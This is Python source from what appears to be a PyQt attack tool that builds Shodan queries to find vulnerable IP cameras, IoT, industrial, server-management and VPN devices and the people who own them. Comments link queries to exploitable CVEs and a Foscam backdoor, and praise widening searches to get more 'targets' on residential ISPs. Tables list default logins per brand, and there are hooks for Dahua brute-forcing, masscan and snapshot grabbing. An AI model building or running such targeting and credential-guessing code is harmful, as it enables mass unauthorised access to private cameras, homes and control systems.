            "Firewall / VPN": ["FortiGate (CVE-2022-40684)", "Citrix NetScaler (CVE-2023-4966)",
                               "Ivanti Connect Secure (CVE-2024-21887)", "SonicWall (CVE-2021-20016)"],
            # Non-HTTP services: the Shodan query still finds them; the HTTP-based
            # scan just won't grade the binary-protocol ones as Good (they land in
            # All/Bad). Elasticsearch does answer HTTP, so it grades normally.
            "Exposed Services": ["MongoDB (no-auth)", "Elasticsearch (no-auth)",
                                 "Redis (no-auth)", "RDP (CVE-2019-0708)", "VNC (no-auth)"],
        }

    def on_iot_type_changed(self, dtype):
        """Cascade: repopulate the IoT Brand/Device list for the chosen type."""
        if not getattr(self, 'iot_brand_combo', None):
            return
        devices = self._iot_device_catalog().get(dtype, [])
        self.iot_brand_combo.blockSignals(True)
        self.iot_brand_combo.clear()
        self.iot_brand_combo.addItems(devices)
        self.iot_brand_combo.blockSignals(False)
        # Apply the new first device's default port + refresh the preview.
        self.on_iot_device_changed()

    def on_iot_device_changed(self, _device=None):
        """Refresh the query preview when the selected device changes. Port/Country
        stay on 'Any' by default for the widest results; the user can pin them."""
        self._preview_multi_iot_query()

    def _iot_device_query_map(self):
        """Broad, banner-based Shodan queries per placeholder device, tuned for
        MAXIMUM matches. Keyed by the device name lowercased, before the '('.
        Port/Country are appended by build_multi_iot_query from the fields (both
        default to 'Any' in Multi IoT mode). Refine these as we validate live."""
        return {
            # ── NAS ──
            "qnap": '"QNAP" "http server"',
            "synology": '"Synology"',
            "wd my cloud": 'http.title:"My Cloud"',
            "asustor": '"Asustor"',
            "terramaster": '"TerraMaster"',
            "buffalo linkstation": 'http.title:"LinkStation"',
            # ── Printers (embedded web-server banners) ──
            "hp": '"Server: HP HTTP Server"',
            "canon": '"Server: KS_HTTP"',
            "brother": '"Server: debut"',
            "epson": '"Server: EPSON-HTTP"',
            "lexmark": '"Server: Lexmark"',
            "xerox": 'http.title:"Xerox"',
            # ── Routers / gateways ──
            "mikrotik": '"MikroTik"',
            "tp-link": 'http.title:"TP-LINK"',
            "netgear": 'http.title:"NETGEAR"',
            "asus": 'http.title:"ASUS Wireless Router"',
            "zyxel": 'http.title:"ZyXEL"',
            "draytek": 'http.title:"Vigor"',        # DrayTek routers = Vigor series
            # ── DVR / NVR ── ("App-webs" is Hikvision's device web-server banner,
            # far higher-count than the plain "Hikvision" keyword)
            "hikvision": '"App-webs/"',
            "dahua": '"Server: Dahua"',
            "xiongmai": '"uc-httpd"',            # XiongMai NetSurveillance httpd
            "vivotek": '"VIVOTEK"',
            "reolink": '"Reolink"',
            # ── Smart home hubs ── (the internet-exposed Sonoff units run Tasmota)
            "sonoff": 'http.title:"Tasmota"',
            "tuya": '"Tuya"',
            "tp-link kasa": '"Kasa"',
            "home assistant": 'http.title:"Home Assistant"',
            "shelly": 'http.title:"Shelly"',
            # ── VoIP / IP phones ──
            "grandstream": 'http.title:"Grandstream Device Configuration"',
            "yealink": '"Yealink"',
            "cisco spa": 'http.title:"SPA Configuration Utility"',
            "fanvil": '"Fanvil"',
            "polycom": '"Polycom"',
            # ── Industrial / SCADA ── (famous PLC dorks; S7 lives on port 102)
            "siemens s7": '"Original Siemens Equipment"',
            "moxa": '"Server: MoxaHttp"',
            "schneider": '"Schneider Electric" "Modicon"',
            "rockwell": '"Rockwell Automation"',
            "advantech": '"Advantech"',
            # ── Server / BMC (management controllers - default logins) ──
            "dell idrac": 'http.title:"iDRAC"',
            "hp ilo": '"HP-iLO"',
            "supermicro ipmi": '"Supermicro"',
            "apc ups": 'http.title:"APC"',
            "vmware esxi": '"VMware ESXi"',
            "webmin": '"Server: MiniServ"',
            # ── Firewall / VPN appliances (mass-exploited unauth CVEs) ──
            "fortigate": 'http.title:"FortiGate"',
            "citrix netscaler": 'http.title:"Citrix"',
            "ivanti connect secure": 'http.title:"Ivanti"',
            "sonicwall": 'http.title:"SonicWall"',
            # ── Exposed services (open/unauthenticated by default) ──
            "mongodb": 'product:"MongoDB"',
            "elasticsearch": 'product:"Elasticsearch"',
            "redis": 'product:"Redis"',
            "rdp": 'port:3389',
            "vnc": '"RFB 003"',
        }

    def _iot_query_for(self, dtype, device):
        """Shodan query for the selected IoT device: a broad banner match from
        _iot_device_query_map (max results), falling back to product:"name" for
        anything not yet mapped. QNAP results are additionally CVE-verified
        per-host by check_qnap_target."""
        name = (device or "").split("(")[0].strip().lower()
        q = self._iot_device_query_map().get(name)
        if q:
            return q
        term = (device or "").split("(")[0].strip() or dtype
        return f'product:"{term}"' if term else ""

    def build_multi_iot_query(self):
        """Shodan query for Multi IoT mode, built from the current Device Type /
        IoT Brand / Port / Country selections. Only used when Multi IoT mode is
        active, so it never affects camera scanning."""
        dtype = self.iot_type_combo.currentText() if getattr(self, 'iot_type_combo', None) else ""
        device = self.iot_brand_combo.currentText() if getattr(self, 'iot_brand_combo', None) else ""
        query = self._iot_query_for(dtype, device)
        if not query:
            return ""
        if "port:" not in query:
            try:
                port = self.iot_port_spin.value()
                if port:
                    query += f" port:{port}"
            except Exception:
                pass
        if "country:" not in query:
            try:
                cc = COUNTRY_CODES.get(self.iot_country_combo.currentText(), "")
                if cc:
                    query += f' country:"{cc}"'
            except Exception:
                pass
        return query.strip()

    def _preview_multi_iot_query(self):
        """Log a live preview of the Multi IoT query as selections change (only
        while the mode is active, so it never spams the camera-mode workflow)."""
        if not getattr(self, 'multi_iot_mode', False):
            return
        try:
            self.log(f"Multi IoT query preview: {self.build_multi_iot_query()}", "info")
        except Exception:
            pass

    def toggle_multi_iot_mode(self, checked):
        """Swap the Quick Search box between camera mode and Multi IoT mode.
        Only Quick Search row visibility changes; everything else is left alone.
        Exiting restores camera-mode visibility exactly via on_brand_changed."""
        self.multi_iot_mode = bool(checked)
        try:
            if self.multi_iot_mode:
                for w in self._camera_quick_widgets:
                    try: w.setVisible(False)
                    except Exception: pass
                # Dahua-only toolbar buttons belong to camera mode - stow them.
                for b in (self.dahua_brute_btn, self.dahua_snap_btn,
                          self.dahua_masscan_btn, self.dahua_export_xml_btn):
                    try: b.setVisible(False)
                    except Exception: pass
                for w in self._multi_iot_widgets:
                    try: w.setVisible(True)
                    except Exception: pass
                # Make sure the Device Type list is filled, then cascade the
                # Brand/Device list. Belt-and-suspenders: if the brand list ends
                # up empty, force-fill it directly from the catalog.
                if self.iot_type_combo.count() == 0:
                    self.iot_type_combo.addItems(list(self._iot_device_catalog().keys()))
                self.on_iot_type_changed(self.iot_type_combo.currentText())
                if self.iot_brand_combo.count() == 0:
                    self.iot_brand_combo.addItems(
                        self._iot_device_catalog().get(self.iot_type_combo.currentText(), []))
                self.log(f"Multi IoT: {self.iot_brand_combo.count()} device(s) listed for "
                         f"type '{self.iot_type_combo.currentText()}' "
                         f"(first: '{self.iot_brand_combo.currentText()}').", "info")
                self.multi_iot_btn.setText("Multi IoT: ON")
                self.log("Multi IoT mode ON - Quick Search now targets non-camera "
                         "IoT devices (placeholders).", "info")
            else:
                for w in self._multi_iot_widgets:
                    try: w.setVisible(False)
                    except Exception: pass
                # The Brand row and the string-row labels (Country:/Pages:) aren't
                # managed by on_brand_changed - restore them first, then let
                # on_brand_changed refine the fields for the current brand.
                try: self.brand_combo.setVisible(True)
                except Exception: pass
                for _lbl in (getattr(self, '_brand_field_label', None),
                             getattr(self, '_country_field_label', None),
                             getattr(self, '_pages_field_label', None)):
                    if _lbl is not None:
                        try: _lbl.setVisible(True)
                        except Exception: pass
                self.on_brand_changed(self.brand_combo.currentText())
                self.multi_iot_btn.setText("Multi IoT Mode")
                self.log("Multi IoT mode OFF - back to camera Quick Search.", "info")
        except Exception as e:
            self.log(f"Multi IoT toggle error: {e}", "warning")

    def build_query(self):
        brand = self.brand_combo.currentText()
        if brand == "Custom Query":
            query = self.custom_query_edit.text().strip()
            if not query:
                QMessageBox.warning(self, "Empty Query", "Please enter a custom Shodan query.")
                return ""
            return query
        country = COUNTRY_CODES[self.country_combo.currentText()]
        port = self.port_spin.value()
        if brand == "Hikvision":
            year = self.year_combo.currentText()
            return f'hikvision {year} port:{port} country:"{country}"'
        elif brand == "Reecam":
            return f'reecam port:{port} country:"{country}"'
        elif brand == "Axis":
            # Axis query uses the exact port you selected – switch to any recommended port in the spin box
            return f'axis port:{port} country:"{country}"'
        elif brand == "DVR LOGIN":
            # DVRs whose web login page is login.rsp (CVE-2018-9995 family).
            return f'html:"login.rsp" port:{port} country:"{country}"'
        elif brand == "WIFICAM":
            # GoAhead-based "Wireless IP Camera (P2P) WIFICAM" family and its
            # 1250+ rebadged clones (CVE-2017-8225). Widened from the narrow
            # version-locked banner ("GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/
            # 3.1.3-OPEN", ~10k matches) to the broader GoAhead-Webs family
            # (~379k matches, verified live) for far more candidates - some of
            # the extra matches won't be the exact vulnerable firmware, but
            # 38x more targets nets more total hits even at a lower per-device
            # rate.
            return f'"GoAhead-Webs" port:{port} country:"{country}"'
        elif brand == "XiongMai":
            # XiongMai Technologies' uc-httpd - a hugely-OEM'd embedded web
            # server used across many DVR/NVR/camera brands (CVE-2017-7577
            # directory traversal / LFI) - identified by its server banner.
            return f'"uc-httpd" port:{port} country:"{country}"'
        elif brand == "Foscam":
            # Foscam-branded (and firmware-sharing rebadge) cameras - hardcoded
            # factory~/Ak47@99 backdoor account (CVE-2018-19067).
            return f'Foscam port:{port} country:"{country}"'
        elif brand == "D-Link":
            # D-Link DCS series cameras - unauthenticated plaintext admin
            # credential disclosure via /config/getuser (CVE-2020-25078,
            # CISA KEV-listed / actively exploited in the wild). Query is the
            # exact "Server:" header these cameras' web daemon sends
            # (confirmed live against a real device) rather than the generic
            # "D-Link DCS" keyword, which matched every D-Link DCS camera
            # regardless of model/firmware - the vast majority of which are
            # patched or a different model, since this CVE is from 2020.
            return f'dcs-lig-httpd port:{port} country:"{country}"'
        elif brand == "Amcrest":
            # Amcrest - Dahua's US OEM partner, shares Dahua's chipset/
            # firmware lineage. Verified live: http.html:"Amcrest" -> 1,539
            # matches, 247 with port:80 applied.
            return f'http.html:"Amcrest" port:{port} country:"{country}"'
        elif brand == "Tapo":
            # TP-Link Tapo cameras' local HTTPS API (used by the Tapo app for
            # RTSP/ONVIF/local login) presents a self-signed cert with CN
            # "TAPO-DEVICE" - live-verified against the Shodan API: this field
            # match returns 239 genuine internet-exposed devices on real
            # residential ISPs (Orange, KDDI, Vodafone, Korea Telecom, ...),
            # versus a generic "Tapo" keyword (560 hits, mostly noise) or
            # ssl:"Tapo" (3308 hits, almost entirely TP-Link's own AWS-hosted
            # cloud infrastructure, not customer devices) - so this is the
            # highest-yield query that's actually devices, not false positives.
            return f'ssl.cert.subject.cn:"TAPO-DEVICE" port:{port} country:"{country}"'
        else:  # AVTech
            return "AVTECH"

    # ------------------------------------------------------------------
    # (All remaining methods unchanged – they are identical to the previous full version)
    # ------------------------------------------------------------------

    def open_link(self, url):
        self.url_bar.setText(url)
        self.load_url_with_retry(url)

    def extract_target_host(self, value):
        text = str(value or "").strip()
        if not text:
            return ""
        if text.startswith(("http://", "https://")):
            text = text.split("//", 1)[1]
        text = text.split("/", 1)[0]
        match = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", text)
        if match:
            return match.group(1)
        if ":" in text and text.count(":") == 1:
            text = text.split(":", 1)[0]
        return text.split()[-1] if text.split() else text

    # -------------------------
    # Masscan management helpers
    # -------------------------
    def get_project_masscan_path(self):
        candidates = [
            Path.cwd() / "masscan" / "masscan.exe",
            Path(__file__).resolve().parent / "masscan" / "masscan.exe",
            Path.cwd() / "masscan.exe",
            Path(__file__).resolve().parent / "masscan.exe",
        ]
        for candidate in candidates:
            try:
                if candidate.exists() and candidate.is_file():
                    return str(candidate)
            except Exception:
                continue
        return ""

    def resolve_masscan_path(self):
        cfg = self.settings.value("masscan_path", "")
        if cfg and Path(str(cfg)).exists():
            return str(cfg)
        project_bin = self.get_project_masscan_path()
        if project_bin:
            self.settings.setValue("masscan_path", project_bin)
            return project_bin
        sys_path = shutil.which("masscan") or shutil.which("masscan.exe")
        return sys_path or ""

    def is_masscan_available(self):
        try:
            return bool(self.resolve_masscan_path())
        except Exception:
            return False

    def show_masscan_dialog(self):
        """Show masscan status and offer to open the download page."""
        # Check settings first, then PATH
        cfg = self.settings.value("masscan_path", "")
        sys_path = shutil.which("masscan")
        if cfg and Path(cfg).exists():
            if QMessageBox.question(self, "Masscan Configured", f"masscan is configured at:\n{cfg}\n\nPick another binary?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
                p, _ = QFileDialog.getOpenFileName(self, "Select masscan executable", "", "Executable Files (*.exe);;All Files (*)")
                if p:
                    self.settings.setValue("masscan_path", p)
                    self.log(f"masscan path set to {p}", "info")
            return
        if sys_path:
            # found in PATH
            if QMessageBox.question(self, "Masscan Found", f"masscan found in PATH at:\n{sys_path}\n\nBrowse to override?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
                p, _ = QFileDialog.getOpenFileName(self, "Select masscan executable", "", "Executable Files (*.exe);;All Files (*)")
                if p:
                    self.settings.setValue("masscan_path", p)
                    self.log(f"masscan path set to {p}", "info")
            return

        # not found — offer to open releases and/or browse for a binary
        if QMessageBox.question(self, "masscan Not Found",
                                "masscan was not found in the project masscan folder, saved settings, or PATH. Open the releases page?",
                                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
            QDesktopServices.openUrl(QUrl("https://github.com/robertdavidgraham/masscan/releases"))
        # allow user to browse for a local binary
        if QMessageBox.question(self, "Browse Local Binary", "Browse for a local masscan binary now?",
                                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
            p, _ = QFileDialog.getOpenFileName(self, "Select masscan executable", "", "Executable Files (*.exe);;All Files (*)")
            if p:
                self.settings.setValue("masscan_path", p)
                self.log(f"masscan path set to {p}", "info")

    def install_masscan(self):
        QDesktopServices.openUrl(QUrl("https://github.com/robertdavidgraham/masscan/releases"))

    def on_ip_scan_type_changed(self, scan_type):
        is_cidr = (scan_type == "CIDR")
        self.cidr_label.setVisible(is_cidr)
        self.cidr_edit.setVisible(is_cidr)
        self.ip_start_label.setVisible(not is_cidr)
        self.ip_start_edit.setVisible(not is_cidr)
        self.ip_end_label.setVisible(not is_cidr)
        self.ip_end_edit.setVisible(not is_cidr)

    # One distinct, dark-theme-readable colour per brand so rows in the
    # Default Passwords tab are visually grouped at a glance.
    BRAND_PASSWORD_COLORS = {
        "Hikvision": "#00d4ff",
        "Dahua": "#ff9800",
        "Reecam": "#4caf50",
        "AVTech": "#ffeb3b",
        "Axis": "#ba68c8",
        "DVR LOGIN": "#f06292",
        "WIFICAM": "#ef5350",
        "XiongMai": "#26c6da",
        "Foscam": "#ffb74d",
        "D-Link": "#64b5f6",
        "Amcrest": "#8d6e63",
        # Multi IoT brands (added alongside the camera brands above)
        "QNAP": "#5c6bc0",
        "Synology": "#26a69a",
        "WD My Cloud": "#42a5f5",
        "Asustor": "#7e57c2",
        "HP": "#66bb6a",
        "Canon": "#ef5350",
        "Brother": "#29b6f6",
        "Epson": "#ab47bc",
        "MikroTik": "#ffa726",
        "TP-Link": "#26c6da",
        "Netgear": "#9ccc65",
        "Asus": "#ec407a",
        "Sonoff": "#ffca28",
        "Tuya": "#ff7043",
        "TP-Link Kasa": "#00acc1",
        "Grandstream": "#78909c",
        "Yealink": "#a1887f",
        "Cisco SPA": "#7986cb",
        "Siemens S7": "#4dd0e1",
        "Moxa": "#d4e157",
        "Schneider": "#4db6ac",
        "TerraMaster": "#8e24aa",
        "Buffalo LinkStation": "#039be5",
        "Lexmark": "#43a047",
        "Xerox": "#e53935",
        "Zyxel": "#00897b",
        "DrayTek": "#fb8c00",
        "Vivotek": "#3949ab",
        "Reolink": "#00acc1",
        "Home Assistant": "#29b6f6",
        "Shelly": "#fdd835",
        "Fanvil": "#6d4c41",
        "Polycom": "#546e7a",
        "Rockwell": "#c0ca33",
        "Advantech": "#26a69a",
        "Dell iDRAC": "#42a5f5",
        "HP iLO": "#26c6da",
        "Supermicro IPMI": "#ef5350",
        "APC UPS": "#66bb6a",
        "VMware ESXi": "#90a4ae",
        "Webmin": "#9ccc65",
        "FortiGate": "#ff7043",
        "Citrix NetScaler": "#9575cd",
        "Ivanti Connect Secure": "#5c6bc0",
        "SonicWall": "#ffa726",
        "MongoDB": "#66bb6a",
        "Elasticsearch": "#fbc02d",
        "Redis": "#ef5350",
        "RDP": "#42a5f5",
        "VNC": "#4db6ac",
    }

    # Default credentials for the Multi IoT brands, same (brand, [(user, pass), ...])
    # shape as BRAND_DEFAULT_PASSWORDS so they render in the same tab/columns.
    IOT_DEFAULT_PASSWORDS = [
        ("QNAP", [("admin", "admin"), ("admin", "password")]),
        ("Synology", [("admin", ""), ("admin", "admin")]),
        ("WD My Cloud", [("admin", "admin"), ("admin", "")]),
        ("Asustor", [("admin", "admin")]),
        ("HP", [("admin", "admin"), ("admin", "")]),
        ("Canon", [("ADMIN", "canon"), ("admin", ""), ("7654321", "")]),
        ("Brother", [("admin", "access"), ("admin", "initpass")]),
        ("Epson", [("EPSONWEB", ""), ("admin", "")]),
        ("MikroTik", [("admin", "")]),
        ("TP-Link", [("admin", "admin")]),
        ("Netgear", [("admin", "password"), ("admin", "1234")]),
        ("Asus", [("admin", "admin")]),
        ("Sonoff", [("admin", "")]),
        ("Tuya", [("admin", "admin")]),
        ("TP-Link Kasa", [("admin", "admin")]),
        ("Grandstream", [("admin", "admin")]),
        ("Yealink", [("admin", "admin")]),
        ("Cisco SPA", [("admin", "admin"), ("user", "")]),
        ("Siemens S7", [("Administrator", "")]),
        ("Moxa", [("admin", "moxa"), ("admin", "")]),
        ("Schneider", [("admin", "admin"), ("USER", "USER")]),
        ("TerraMaster", [("admin", "admin"), ("root", "admin")]),
        ("Buffalo LinkStation", [("admin", "password")]),
        ("Lexmark", [("admin", "")]),
        ("Xerox", [("admin", "1111")]),
        ("Zyxel", [("admin", "1234"), ("admin", "admin")]),
        ("DrayTek", [("admin", "admin")]),
        ("Vivotek", [("root", "")]),
        ("Reolink", [("admin", "")]),
        ("Home Assistant", [("admin", "admin")]),
        ("Shelly", [("admin", "")]),
        ("Fanvil", [("admin", "admin")]),
        ("Polycom", [("Polycom", "456"), ("admin", "456")]),
        ("Rockwell", [("administrator", "")]),
        ("Advantech", [("webaccess", ""), ("admin", "")]),
        # Server / BMC (famous shipped default logins)
        ("Dell iDRAC", [("root", "calvin")]),
        ("HP iLO", [("Administrator", "(8-char on chassis tag)")]),
        ("Supermicro IPMI", [("ADMIN", "ADMIN")]),
        ("APC UPS", [("apc", "apc"), ("device", "apc")]),
        ("VMware ESXi", [("root", "(set at install)")]),
        ("Webmin", [("root", "(system root pw)"), ("admin", "")]),
        # Firewall / VPN appliances
        ("FortiGate", [("admin", "")]),
        ("Citrix NetScaler", [("nsroot", "nsroot")]),
        ("Ivanti Connect Secure", [("admin", "(appliance-set)")]),
        ("SonicWall", [("admin", "password")]),
        # Exposed services (open by default - no login to brute)
        ("MongoDB", [("(none)", "no auth by default")]),
        ("Elasticsearch", [("(none)", "no auth by default")]),
        ("Redis", [("(none)", "no auth by default")]),
        ("RDP", [("Administrator", "(weak/guessable)")]),
        ("VNC", [("(none)", "often no password")]),
    ]

    def populate_default_passwords(self):
        # Each brand is a clickable header row that collapses/expands its own
        # credential rows (via setRowHidden), so long brand lists don't force
        # scrolling. Still a plain QTableWidget - same look, same 3 columns.
        self.passwords_table.setRowCount(0)
        try:
            self.passwords_table.clearSpans()
        except Exception:
            pass
        self._pw_brand_rows = {}                       # header_row -> [child rows]
        self._pw_collapsed = getattr(self, '_pw_collapsed', {})  # brand -> collapsed?
        ncols = self.passwords_table.columnCount()
        all_groups = list(BRAND_DEFAULT_PASSWORDS) + list(self.IOT_DEFAULT_PASSWORDS)
        for brand, creds in all_groups:
            color = QColor(self.BRAND_PASSWORD_COLORS.get(brand, "#e0e0e0"))
            # Brands start collapsed on every load; the user expands what they need.
            collapsed = self._pw_collapsed.get(brand, True)
            # Brand header row (spans all columns, click to collapse/expand).
            header_row = self.passwords_table.rowCount()
            self.passwords_table.insertRow(header_row)
            hdr = QTableWidgetItem(f"  {brand}   ({len(creds)})")
            hdr.setIcon(self._arrow_icon("right" if collapsed else "down"))
            hf = hdr.font(); hf.setBold(True); hdr.setFont(hf)
            hdr.setForeground(color)
            hdr.setBackground(QColor("#161616"))
            hdr.setFlags(Qt.ItemFlag.ItemIsEnabled)     # not selectable/editable
            hdr.setData(1000, brand)                     # tag: this is a header
            self.passwords_table.setItem(header_row, 0, hdr)
            if ncols > 1:
                self.passwords_table.setSpan(header_row, 0, 1, ncols)
            child_rows = []
            for username, password in creds:
                row = self.passwords_table.rowCount()
                self.passwords_table.insertRow(row)
                items = [QTableWidgetItem(brand), QTableWidgetItem(username), QTableWidgetItem(password)]
                for col, item in enumerate(items):
                    item.setForeground(color)
                    self.passwords_table.setItem(row, col, item)
                child_rows.append(row)
                if collapsed:
                    self.passwords_table.setRowHidden(row, True)
            self._pw_brand_rows[header_row] = child_rows

    def _toggle_password_brand(self, row, column=0):
        """Collapse/expand a brand's credential rows when its header row is
        clicked. No-op when a normal credential row is clicked."""
        rows = getattr(self, '_pw_brand_rows', {})
        if row not in rows:
            return
        child_rows = rows[row]
        currently_hidden = (self.passwords_table.isRowHidden(child_rows[0])
                            if child_rows else False)
        new_hidden = not currently_hidden
        for r in child_rows:
            self.passwords_table.setRowHidden(r, new_hidden)
        hdr = self.passwords_table.item(row, 0)
        if hdr:
            hdr.setIcon(self._arrow_icon("right" if new_hidden else "down"))
            brand = hdr.data(1000)
            if brand is not None:
                if not hasattr(self, '_pw_collapsed'):
                    self._pw_collapsed = {}
                self._pw_collapsed[brand] = new_hidden

    def update_table_headers(self):
        brand = self.brand_combo.currentText()
        if brand in ("IP Scanner", "Dahua"):
            headers = ["IP", "Hostname", "Open Ports", "Banner", "Web Detect"]
            for tbl in [self.table, self.good_table, self.bad_table, self.port22_table]:
                tbl.setColumnCount(len(headers))
                tbl.setHorizontalHeaderLabels(headers)
        else:
            headers = ["IP", "URL", "Status", "Code"]
            for tbl in [self.table, self.good_table, self.bad_table, self.port22_table]:
                tbl.setColumnCount(len(headers))
                tbl.setHorizontalHeaderLabels(headers)
    def switch_to_webengine(self):
        if self.ie:
            try:
                self.ie.Quit()
            except Exception:
                pass
            self.ie = None
        self.use_ie = False
        self.log("Switched to Qt WebEngine fallback.", "success")
        self.setup_browser()
        self.navigate_start_page()
        self.save_settings()

    def switch_to_ie(self):
        if not IE_AVAILABLE:
            self.log("IE not available on this system.", "warning")
            return
        if not self.use_ie:
            self.use_ie = True
            self.log("Switched back to IE11 mode.", "success")
            self.setup_browser()
            self.navigate_start_page()
            self.save_settings()
        else:
            self.log("Already using IE11.", "info")

    def restart_ie_process(self):
        """Force-kill any stuck iexplore.exe/ielowutil.exe processes and start a fresh embedded IE.

        For when the embedded IE11 instance hangs and won't respond to normal
        Quit()/navigation calls - this clears it out at the OS process level
        instead, then re-creates it the same way setup_ie() normally does.
        """
        if not IE_AVAILABLE:
            self.log("IE not available on this system.", "warning")
            return
        self.log("Restarting Internet Explorer process...", "info")
        try:
            if self.ie:
                try:
                    self.ie.Quit()
                except Exception:
                    pass
                self.ie = None
            self.ie_hwnd = None

            for proc_name in ("iexplore.exe", "ielowutil.exe"):
                try:
                    result = subprocess.run(
                        ["taskkill", "/F", "/T", "/IM", proc_name],
                        capture_output=True, text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                    )
                    if result.returncode == 0:
                        self.log(f"Stopped {proc_name}.", "success")
                    else:
                        # returncode 128 means "process not found" - not an error, nothing was stuck
                        self.log(f"{proc_name} was not running.", "info")
                except Exception as e:
                    self.log(f"Could not stop {proc_name}: {e}", "warning")

            if self.use_ie:
                QTimer.singleShot(300, self.setup_ie)
                self.log("Internet Explorer process restarted.", "success")
            else:
                self.log("IE processes cleared (currently using WebEngine, not restarting IE view).", "info")
        except Exception as e:
            self.log(f"Restart IE process error: {e}", "error")

    def open_pss_view(self):
        """Open a minimal SmartPSS-like preview for the selected Dahua device.

        This dialog is intentionally conservative: it will attempt a probe using
        `modules.dahua_scanner.DahuaScanner` only when the user presses the
        "Fetch Snapshot" button. Probing respects the configured default
        credential list; no exploitation is performed.
        """
        brand = self.brand_combo.currentText()
        if brand != "Dahua":
            QMessageBox.information(self, "PSS View", "PSS view is intended for Dahua results. Select a Dahua result and try again.")
            return
        row = self.table.currentRow()
        if row < 0 or row >= len(self.results):
            QMessageBox.information(self, "PSS View", "No device selected. Select a device row first.")
            return
        data = self.results[row]
        ip = data.get('ip') or data.get('url') or ''

        dlg = QDialog(self)
        dlg.setWindowTitle(f"PSS Preview - {ip}")
        layout = QVBoxLayout(dlg)
        info = QLabel(f"Device: {ip}")
        layout.addWidget(info)
        fetch_btn = QPushButton("Fetch Snapshot (auth required)")
        layout.addWidget(fetch_btn)
        img_label = QLabel()
        img_label.setFixedSize(360, 240)
        layout.addWidget(img_label)

        def on_fetch():
            scanner = DahuaScanner()
            self.log(f"Probing {ip} for Dahua (local only)...", "info")
            try:
                res = scanner.probe(ip)
                if res.get('status') == 'auth_ok':
                    # prefer controller returned by probe, otherwise try to construct one
                    ctrl = res.get('controller')
                    if not ctrl and getattr(scanner, 'DahuaController', None):
                        try:
                            ctrl = scanner.DahuaController(ip, int(res.get('port', 37777)), res.get('login'), res.get('password'))
                        except Exception as e:
                            raise RuntimeError(f"Failed to create Dahua controller: {e}")

                    if not ctrl:
                        raise RuntimeError("No controller available to fetch snapshot")

                    img_bytes = scanner.get_snapshot_bytes(ctrl, 0)
                    if not img_bytes:
                        raise RuntimeError("Snapshot returned no data")
                    pix = QPixmap()
                    ok = pix.loadFromData(img_bytes)
                    if not ok:
                        raise RuntimeError("Failed to decode image data")
                    img_label.setPixmap(pix.scaled(img_label.width(), img_label.height(), Qt.AspectRatioMode.KeepAspectRatio))
                else:
                    QMessageBox.information(self, "Auth failed", f"Status: {res.get('status')}. Provide credentials in Default Passwords table or use the scanner manually.")
            except Exception as e:
                self.log(f"PSS snapshot error: {e}", "error")
                QMessageBox.warning(self, "Snapshot failed", str(e))

        fetch_btn.clicked.connect(on_fetch)
        dlg.exec()

    # ------------------
    # Embedded PSS Mode (polished)
    # ------------------
    def create_pss_widget(self):
        """Create an embedded PSS view with a left sidebar and a main feed grid.

        The left sidebar lists devices and exposes PSS-specific settings (Live, PTZ, Quality).
        The main area contains a scrollable grid of feed placeholders with optional PTZ overlays.
        """
        w = QWidget()
        w.setObjectName("pss_widget")
        w.setStyleSheet("""
            #pss_widget { background: #24272c; }
            #pss_left {
                background: #181a1f;
                color: #e4e7eb;
                border-right: 1px solid #333840;
            }
            #pss_main {
                background: #24272c;
                border: none;
            }
            #pss_header {
                background: #1c1f24;
                border: none;
                border-radius: 4px;
            }
            #pss_title {
                color: #f2f5f7;
                font-size: 13px;
                font-weight: 700;
            }
            #pss_subtitle {
                color: #8f99a6;
                font-size: 10px;
            }
            #pss_section_label {
                color: #cdd3da;
                font-size: 11px;
                font-weight: 700;
            }
            #pss_metric {
                background: #202329;
                color: #dfe5eb;
                border: 1px solid #343941;
                border-radius: 4px;
                padding: 7px;
            }
            #pss_devices {
                background: #111318;
                color: #d7dde4;
                border: 1px solid #2f343c;
                border-radius: 4px;
                outline: 0;
                padding: 4px;
            }
            #pss_devices::item {
                min-height: 28px;
                padding: 5px 8px;
                border-bottom: 1px solid #20242a;
            }
            #pss_devices::item:selected {
                background: #2f6f8f;
                color: #ffffff;
                border-radius: 3px;
            }
            #pss_feed_scroll {
                background: #24272c;
                border: 1px solid #424851;
                border-radius: 4px;
            }
            #pss_feed_container { background: #24272c; }
            QGroupBox {
                color: #d8dee5;
                border: none;
                border-radius: 4px;
                margin-top: 10px;
                padding: 10px 8px 8px 8px;
                font-weight: 700;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 4px;
                background: #181a1f;
            }
            QPushButton {
                background: #2b3037;
                color: #e5e9ef;
                border: 1px solid #424851;
                border-radius: 4px;
                padding: 6px 9px;
                font-weight: 600;
            }
            QPushButton:hover { background: #363c44; border-color: #5c6570; }
            QPushButton:checked { background: #2f6f8f; border-color: #5faccd; color: #ffffff; }
            QLineEdit, QComboBox {
                background: #111318;
                color: #e5e9ef;
                border: 1px solid #343941;
                border-radius: 4px;
                padding: 5px 7px;
            }
            QComboBox {
                combobox-popup: 0;
            }
            QComboBox QAbstractItemView {
                background: #16191e;
                color: #e5e9ef;
                border: 1px solid #343941;
                selection-background-color: #2f6f8f;
                selection-color: #ffffff;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                min-height: 22px;
                padding: 3px 8px;
            }
            QCheckBox { color: #d7dde4; spacing: 7px; }
        """)
        outer_layout = QHBoxLayout(w)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.setSpacing(0)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.setChildrenCollapsible(False)

        # Left sidebar (devices + settings)
        left = QFrame()
        left.setObjectName("pss_left")
        left.setMinimumWidth(270)
        left.setMaximumWidth(360)
        left_layout = QVBoxLayout(left)
        left_layout.setContentsMargins(10, 10, 10, 10)
        left_layout.setSpacing(10)

        left_title = QLabel("Smart PSS")
        left_title.setObjectName("pss_title")
        left_layout.addWidget(left_title)

        left_subtitle = QLabel("Device control and channel layout")
        left_subtitle.setObjectName("pss_subtitle")
        left_layout.addWidget(left_subtitle)

        summary_row = QWidget()
        summary_layout = QHBoxLayout(summary_row)
